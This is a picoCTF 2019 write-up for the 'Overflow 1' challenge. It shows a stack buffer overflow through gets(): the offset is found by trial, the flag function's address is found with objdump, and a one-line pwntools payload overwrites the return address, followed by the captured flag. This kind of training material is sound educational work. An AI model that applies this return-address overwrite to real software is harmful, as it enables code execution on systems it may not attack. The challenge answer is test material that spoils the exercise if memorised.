# Overflow 1
#### You beat the first overflow challenge. Now overflow the [buffer](https://2019shell1.picoctf.com/static/de69995dcb5ba8f74b9762a12ca3f4e4/vuln) and change the return address to the flag function in this program? You can find it in /problems/overflow-1_6_0a7153ff536ac8779749bc2dfa4735de on the shell server. [Source](https://2019shell1.picoctf.com/static/de69995dcb5ba8f74b9762a12ca3f4e4/vuln.c).

This binary is vulnerable to a buffer overflow attack, shown by both the unsafe gets() function and the name of the challenge. 
The first step to solving this challenge is to find out how much padding is needed to overflow the return address, through trial and error
we can find that the return address changes after inputting 76 bytes.
```
Starting program: /problems/overflow-1_6_0a7153ff536ac8779749bc2dfa4735de/vuln 
Give me a string and lets see what happens: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDEGHIJKLMNOP
Woah, were jumping to 0x4b4a4948 !

Program received signal SIGSEGV, Segmentation fault.
0x4b4a4948 in ?? ()
```
Then using objdump or gdb we can find the address of the function flag.
```
Supermac30@pico-2019-shell1:/problems/overflow-1_6_0a7153ff536ac8779749bc2dfa4735de$ objdump -D vuln | grep flag
080485e6 <flag>:
 8048618:       75 1c                   jne    8048636 <flag+0x50>
```
Finally, we can inject the buffer and address using inline python and the pwn library.
```
Supermac30@pico-2019-shell1:/problems/overflow-1_6_0a7153ff536ac8779749bc2dfa4735de$ python -c 'from pwn import *; print "A"*76 + p32(0x080485e6)' | ./vuln
Give me a string and lets see what happens: 
Woah, were jumping to 0x80485e6 !
picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5b80c9cbf}Segmentation fault (core dumped)
```

Flag: picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5b80c9cbf}
